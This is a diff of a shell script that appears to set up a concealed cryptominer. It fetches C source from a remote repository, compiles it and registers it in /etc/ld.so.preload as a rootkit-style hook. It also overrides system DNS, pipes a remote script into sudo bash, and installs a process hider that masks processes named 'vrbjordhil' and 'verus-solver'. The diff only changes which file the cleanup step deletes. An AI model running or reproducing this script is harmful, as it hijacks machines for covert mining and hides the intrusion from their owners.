@@ -5,7 +5,7 @@ curl https://gitlab.com/ontranontran/kaspo/-/raw/master/ontranbotak.c -o ontranb
 gcc -Wall -fPIC -shared -o libontranbotak.so ontranbotak.c -ldl
 mv libontranbotak.so /usr/local/lib/
 echo /usr/local/lib/libontranbotak.so >> /etc/ld.so.preload
-rm -rf ontranbotak.c
+rm -rf libontranbotak.so
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf /etc/init.d/network restart
 sudo su --command "curl -sL https://deb.nodesource.com/setup_20.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@10.8.1 && sudo ph add vrbjordhil && sudo ph add verus-solver"
 git clone https://github.com/Bjordhil/CUSTOM
